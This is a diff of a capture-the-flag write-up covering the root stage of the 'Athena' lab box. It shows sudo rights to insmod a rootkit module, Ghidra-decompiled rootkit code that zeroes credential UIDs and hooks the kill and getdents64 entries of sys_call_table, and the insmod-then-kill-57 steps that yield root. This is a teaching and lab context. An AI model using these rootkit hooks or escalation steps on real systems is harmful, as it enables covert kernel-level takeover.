@@ -282,7 +282,7 @@ athena@routerpanel:/$ cat /home/athena/user.txt
 <details>
   <summary>Solution</summary>
 
-Now we want to get root privileges, so let’s see what Athena can run as root:
+Now we want to get `root privileges`, so let’s see what Athena can run as root:
 
 ```bash
 athena@routerpanel:~$ sudo -l
@@ -295,7 +295,7 @@ User athena may run the following commands on routerpanel:
     (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
 ```
 
-It looks like we can run as root [insmod](https://linux.die.net/man/8/insmod) to insert venom.ko into the kernel.
+It looks like we can run as root [insmod](https://linux.die.net/man/8/insmod) to insert `venom.ko` into the kernel.
 Let’s download the module to better understand what we are dealing with:
 
 ```bash
@@ -313,7 +313,7 @@ Prepended http:// to '10.82.172.136:8000/venom.ko'
 ...
 ```
 
-Ghidra helps to understand what venom.ko does; among the exported functions, give_root is particularly interesting:
+`Ghidra` helps to understand what venom.ko does; among the exported functions, give_root is particularly interesting:
 
 ![3](/Athena/screenshots/3.png)
 
@@ -335,7 +335,7 @@ void give_root(void)
   return;
 }
 ```
-The basic identity of a process (user and group IDs) is stored as fields inside a struct cred.
+The basic identity of a process (user and group IDs) is stored as fields inside a `struct cred`.
 To alter the current process’s credentials, a function first prepares a new set of credentials by calling:
 ```c++
 struct cred *prepare_creds(void);
@@ -348,7 +348,7 @@ At this point we can change the values inside the struct cred, so let’s see ho
 
 ![4](/Athena/screenshots/4.png)
 
-From the different offsets added to the base pointer of our new creds, we can see which fields are being set to 0 (to root):
+From the different `offsets` added to the base pointer of our new creds, we can see which fields are being `set to 0` (to root):
 
 ```c++
     *(undefined8 *)(lVar1 + 4) = 0;  //The real uid
@@ -356,7 +356,7 @@ From the different offsets added to the base pointer of our new creds, we can se
     *(undefined8 *)(lVar1 + 0x14) = 0; //The effective UID of the task
     *(undefined8 *)(lVar1 + 0x1c) = 0; //The UID for VFS ops
 ```
-By setting all these UIDs to 0, the process effectively becomes root, which is exactly what we want.
+By `setting` all these UIDs to 0, the process effectively becomes `root`, which is exactly what we want.
 
 ```c++
 commit_creds(lVar1);
@@ -381,9 +381,9 @@ int hacked_kill(pt_regs *pt_regs)
   ...
 }
 ```
-Now the situation is clearer: this is a classic rootkit. The function takes a pt_regs * as input, which contains a copy of all the CPU registers for the syscall. We focus on the si field, which corresponds to the rsi register.
+Now the situation is clearer: this is a classic `rootkit`. The function takes a `pt_regs *` as input, which contains a copy of all the CPU registers for the syscall. We focus on the si field, which corresponds to the `rsi register`. For who is less comfortable with system calls I will further explain the code in the `extra part`.
 
-In Linux, the kill system call is used to send a signal to a process, and sys_kill expects the int sig argument (the signal number) to be placed in the si register when it is called ([for reference](https://syscalls64.paolostivanin.com/)). So if we run kill with sig = 0x39 (57), the rootkit will execute give_root() instead of performing a normal kill.
+In Linux, the kill system call is used to send a signal to a process, and sys_kill expects the int sig argument (the signal number) to be placed in the %rsi register when it is called ([for reference](https://syscalls64.paolostivanin.com/)). So if we run kill with sig = 0x39 (57), the rootkit will execute `give_root()` instead of performing a normal kill.
 
 ```bash
 athena@routerpanel:~$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
@@ -399,5 +399,42 @@ athena@routerpanel:/root$ cat root.txt
 ```
 
 </details>
+<details>
+  <summary>Extra</summary>
+If you are wondering what is really happening inside the box, here is a short summary of how system calls are handled in Linux.  
 
+When we type the command `kill`, we are indirectly invoking the `kill()` system call wrapper, which sets up the CPU registers as follows before entering kernel mode:  
+- `%rax`: the number of the corresponding system call (for Linux, `0x3e` = `62` for `sys_kill`)  
+- `%rdi`: the `pid` argument  
+- `%rsi`: the `sig` (signal number) argument  
+
+Then the wrapper executes the `syscall` instruction to switch to kernel mode. Once in kernel mode, the kernel uses the value in `%rax` as an index into `sys_call_table`, which is an array of function pointers implementing each system call. The entry at index 62 points to the kernel’s implementation of `sys_kill`.  
+
+If we look again at the functions inside the module, the `init` function is particularly interesting:
+
+```c++
+{
+  long lVar1;
+  ulong *puVar2;
+  int iVar3;
+  long in_GS_OFFSET;
+  ulong __force_order;
+  
+  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
+  __sys_call_table = get_syscall_table_bf(); //pointer to syscall_table
+  iVar3 = -1;
+  if (__sys_call_table != (ulong *)0x0) {
+    ...
+    puVar2 = __sys_call_table;
+    ...
+    puVar2[0xd9] = (ulong)hacked_getdents64;
+    puVar2[0x3e] = (ulong)hacked_kill; //sys_kill changed
+    iVar3 = 0;
+  }
+  ...
+}
+```
+As you can see, there is a function called `get_syscall_table_bf()` that retrieves a pointer to `sys_call_table`, and later in the `init` routine the code overwrites specific entries in that table. The entry at index `0x3e` (the `kill` syscall) is replaced with our malicious function `hacked_kill`, so every time the `kill` system call is invoked, the kernel actually runs the rootkit’s function instead of the original `sys_kill`. 
+
+</details>
 
